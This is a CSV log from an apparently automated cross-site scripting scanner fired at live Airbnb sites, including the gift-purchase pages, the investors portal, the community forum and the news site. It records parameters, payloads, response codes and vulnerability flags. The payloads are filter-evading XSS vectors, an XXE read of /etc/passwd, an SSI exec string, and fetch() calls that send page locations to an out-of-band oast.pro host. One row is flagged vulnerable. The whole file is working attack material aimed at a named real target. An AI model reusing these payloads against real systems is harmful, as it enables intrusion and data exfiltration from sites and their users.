url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://investors.airbnb.com/home/default.aspx,_ctrl0$ctl21$chkLists$0,javascript%3Aalert%28%22XSS%22%29,nginx,POST,403,2.3690245151519775,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=sunset,sender_name,"%00""%00>%00<script%00>alert%28%00""XSS%00""%29%00</script%00>",nginx,GET,403,2.5449044704437256,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,9,3
http://airbnb.com/gift/buy?country=US&card_name=poolside,recipient_name,"<TD BACKGROUND=""javascript:al	ert(1)('XSS')"">",nginx,GET,403,2.510499954223633,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,9,3
http://airbnb.com/gift/buy?country=US&card_name=ladder,gift_message,"&#x3c;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&#x3e;",nginx,GET,403,2.513111114501953,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,9,3
https://investors.airbnb.com/default.aspx,__EVENTTARGET,"<stYLe>LI {LiST-STyLe-iMaGE: URl(""JavaScriPt:AlERt('xss')"");}</StyLe><uL><LI></UL>",nginx,POST,403,2.326746702194214,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,submitContext,javascript%3Afetch%28%27//99o5acu1yd5e.oast.pro/js%3Floc%3D%27%2Bbtoa%28window.location%29%29,apache,POST,500,3.4122729301452637,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/home/default.aspx,_ctrl0$ctl21$chkLists$1,%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/iframe%3E,nginx,POST,403,2.6023008823394775,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=poolside,gift_message,%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A///etc/passwd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C/foo%3E,nginx,GET,403,2.5394859313964844,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,9,3
http://airbnb.com/gift/buy?country=US&card_name=ladder,sender_name,<Svg><p><stYLE><IMG sRc=1 hrEf=1 onErRoR=ALerT(1)></P></SVG>,nginx,GET,403,2.561847686767578,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,9,3
https://investors.airbnb.com/default.aspx,__EVENTARGUMENT,<script>fetch('//99o5acu1yd5e.oast.pro/script?loc='+btoa(window.location))</script>,nginx,POST,403,2.370758056640625,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/home/default.aspx,_ctrl0$ctl21$chkLists$2,"%00<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))%00>",nginx,POST,403,2.668553590774536,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,messageSearchField,"&#x3c;?xml version=""1.0"" encoding=""ISO-8859-1""?&#x3e;&#x3c;foo&#x3e;&#x3c;![CDATA[&#x3c;]]&#x3e;SCRIPT&#x3c;![CDATA[&#x3e;]]&#x3e;alert('XSS')&#x3c;![CDATA[&#x3c;]]&#x3e;/SCRIPT&#x3c;![CDATA[&#x3e;]]&#x3e;&#x3c;/foo&#x3e;",apache,POST,500,3.326115131378174,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=poolside,sender_name,"javascript:eval(""alert('XSS')"")",nginx,GET,403,2.566115617752075,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,9,3
https://investors.airbnb.com/default.aspx,__VIEWSTATE,%00<BODY ONLOAD=alert(%00'XSS%00')%00>,nginx,POST,403,2.3998897075653076,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/home/default.aspx,_ctrl0$ctl21$chkLists$3,"%00<a href=%00""javascript:void(0)%00"" onmouseover=%00""alert(1)%00""%00>Click Me%00</a%00>",nginx,POST,403,2.5651402473449707,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,messageSearchField_0,"&#x3c;script&#x3e;alert(""XSS"")&#x3c;/script&#x3e;",apache,POST,500,2.3209800720214844,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/default.aspx,_ctrl0$ctl21$txtEmail,"<ImG SrC=x ONErrOr=evAl(""aLERt('XsS')"")>",nginx,POST,403,2.451442241668701,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/home/default.aspx,_ctrl0$ctl21$chkLists$4,%3Cform%20action%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3Cinput%20type%3D%22submit%22%3E%3C/form%3E,nginx,POST,403,2.379938840866089,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108743935&purchaseAttemptId=1750108743935&card_id=9017,query,"<a href=""javascript:confirm('XSS')"">Click Me</a>",nginx,GET,200,4.163528680801392,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://investors.airbnb.com/default.aspx,_ctrl0$ctl21$chkLists$0,"&#x3c;img src=""http://example.com/image.jpg""&#x3e;",nginx,POST,403,2.5726051330566406,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/home/default.aspx,_ctrl0$ctl21$btnSubmit,<s<Sc<script>ript>alert('XSS')</script>,nginx,POST,403,2.346912384033203,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,userSearchField,"<form action=""javascript:al	ert(1)('XSS')""><input type=""submit""></form>",apache,POST,500,4.118048906326294,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/default.aspx,_ctrl0$ctl21$chkLists$1,"%00<form action=%00""javascript:alert(%00'XSS%00')%00""%00>%00<input type=%00""submit%00""%00>%00</form%00>",nginx,POST,403,2.9454686641693115,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108744589&purchaseAttemptId=1750108744589&card_id=9018,query,<BODY ONLOAD=al	ert(1)('XSS')>,nginx,GET,200,2.9730350971221924,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://investors.airbnb.com/home/default.aspx,__antiCSRF,"&#x3c;form action=""javascript:alert('XSS')""&#x3e;&#x3c;input type=""submit""&#x3e;&#x3c;/form&#x3e;",nginx,POST,403,2.8886919021606445,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/default.aspx,_ctrl0$ctl21$chkLists$2,"<iframe src=""javascript:al	ert(1)('XSS')""></iframe>",nginx,POST,403,2.456061601638794,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108743264&purchaseAttemptId=1750108743264&card_id=9021,query,"<img src=x on/**/error=alert(""XSS"")>",nginx,GET,200,4.4322943687438965,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://investors.airbnb.com/home/default.aspx,__RequestVerificationAntiCSRFToken,"%00<img src=%00""http://example.com/image.jpg%00""%00>",nginx,POST,403,2.8213610649108887,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,noteSearchField,&#x3c;img&#x3e;,apache,POST,500,6.135964870452881,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=artic,delivery_method_digital,&#34><imG SRc=x oNERROR=AlErt('Xss')>,nginx,GET,403,2.7761759757995605,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://investors.airbnb.com/default.aspx,_ctrl0$ctl21$chkLists$3,"javascript:alert(%00""XSS%00"")",nginx,POST,403,2.9595742225646973,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/home/default.aspx,__SCROLLPOSITIONX,&#x22><img src=x onerror=al	ert(1)('XSS')>,nginx,POST,403,2.3196890354156494,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=artic,delivery_method_sms,"<img src=x onerror=alert(""XSS"")>",nginx,GET,403,2.5271453857421875,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,productSearchField,"<TABLE><TD BACKGROUND=""javascript:al	ert(1)('XSS')"">",apache,POST,500,3.2600021362304688,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US,delivery_method_digital,&#x3c;img&#x3e;,nginx,GET,403,2.5437605381011963,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://investors.airbnb.com/home/default.aspx,__SCROLLPOSITIONY,"<style>li {list-style-image: url(""javascript:alert('XSS')"");}</style><ul><li></ul>",nginx,POST,403,2.7691824436187744,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/default.aspx,_ctrl0$ctl21$chkLists$4,&#34><img src=x onerror=alert('XSS')>,nginx,POST,403,3.0313150882720947,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=artic,recipient_name,&#34;><img src=x on/**/error=alert('XSS')>,nginx,GET,403,2.876981258392334,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/forumpage.searchformv32.form.form,as-search-action-id,%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,apache,POST,500,3.2992336750030518,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/default.aspx,_ctrl0$ctl21$btnSubmit,"<DIV STYLE=""width: expression(al	ert(1)('XSS'));"">",nginx,POST,403,2.2228684425354004,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US,delivery_method_sms,"<form action=""javascript:alert('XSS')""><input type=""submit""></form>",nginx,GET,403,2.4924659729003906,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=artic,gift_message,%3Cscript%3Efetch%28%27//99o5acu1yd5e.oast.pro/script%3Floc%3D%27%2Bbtoa%28window.location%29%29%3C/script%3E,nginx,GET,403,2.5553643703460693,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://news.airbnb.com/ea/,s,%3Csvg/onload%3Dfetch%28%27//99o5acu1yd5e.oast.pro/svg%3Floc%3D%27%2Bbtoa%28window.location%29%29%3E,nginx,GET,200,2.9933180809020996,"<html lang=""es-ES""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,"<html lang=""es-ES""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,script,1,2,1,0,0,script_content,0,0
http://airbnb.com/gift/buy?country=US,recipient_name,"&#x3c;img src=x onerror=eval(""alert('XSS')"")&#x3e;",nginx,GET,403,2.4675281047821045,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://investors.airbnb.com/default.aspx,__antiCSRF,%3Ca%20href%3D%22javascript%3Aconfirm%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,nginx,POST,403,2.5859768390655518,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=artic,sender_name,%22%3E%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,nginx,GET,403,2.469318389892578,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://investors.airbnb.com/default.aspx,__RequestVerificationAntiCSRFToken,"<A foo=a sRc=""javASCRIPt:alErt('xSs')"">ClIcK me</a>",nginx,POST,403,2.2021121978759766,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US,gift_message,"data:text/html,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",nginx,GET,403,2.533569812774658,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=seagulls,delivery_method_digital,%3Ca%20foo%3Da%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,nginx,GET,403,3.054255962371826,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://investors.airbnb.com/default.aspx,__SCROLLPOSITIONX,"<img onmouseover=""alert('XSS')"" src=""x"">",nginx,POST,403,2.804290771484375,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US,sender_name,"'; al	ert(1)(String.fromCharCode(88,83,83))//'; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//--></SCRIPT>"">'; al	ert(1)(String.fromCharCode(88,83,83))//'; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//""; al	ert(1)(String.fromCharCode(88,83,83))//--></SCRIPT>",nginx,GET,403,2.5341796875,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
http://airbnb.com/gift/buy?country=US&card_name=seagulls,delivery_method_sms,%3Cimg%20foo%3Da%20onerror%3D%22alert%28%27XSS%27%29%22%3E,nginx,GET,403,2.631603479385376,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://news.airbnb.com/zh/,s,"<img src=x onerror=eval(""alert('XSS')"")>",nginx,GET,200,3.3487331867218018,"<html lang=""zh-CN""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,"<html lang=""zh-CN""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,attribute,1,2,1,1,0,attribute,0,0
https://investors.airbnb.com/default.aspx,__SCROLLPOSITIONY,"%00<!--#exec cmd=%00""/bin/echo %00'%00<SCR%00'+%00'IPT%00>alert(%00""XSS%00"")%00</SCR%00'+%00'IPT%00>%00'%00""--%00>",nginx,POST,403,2.4106431007385254,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
http://airbnb.com/gift/buy?country=US&card_name=seagulls,recipient_name,"""><img src=x onerror=al	ert(1)(""XSS"")>",nginx,GET,403,2.5465333461761475,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
http://airbnb.com/#EUSchedule1,query,"<a hReF=""JAvAsCRiPt:AlERT('xSs')"">clicK Me</A>",nginx,GET,200,2.895559072494507,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,11,1
https://investors.airbnb.com/events-and-presentations/default.aspx,__EVENTTARGET,"<fORM aCtiOn=""JAVaScRiPt:aLeRt('xSS')""><InPUt Type=""SubMIt""></fOrm>",nginx,POST,403,2.376636028289795,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
http://airbnb.com/gift/buy?country=US&card_name=seagulls,gift_message,<sCriPt>fETch('//99o5ACU1yD5E.oaST.pRo/SCRipt?LOc='+BToa(wInDoW.lOCatioN))</scRiPT>,nginx,GET,403,2.5550012588500977,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,"<html lang=""en""><head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
</hea",0,generic,0,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.messageeditorform.form.form.form,t:ac,"<a foo=a href=""javascript:al	ert(1)('XSS')"">Click Me</a>",apache,POST,403,2.4660215377807617,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/postpage.searchformv32.form.form,t:ac,"&#x3c;DIV STYLE=""width: expression(alert('XSS'));""&#x3e;",apache,POST,500,6.292414665222168,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
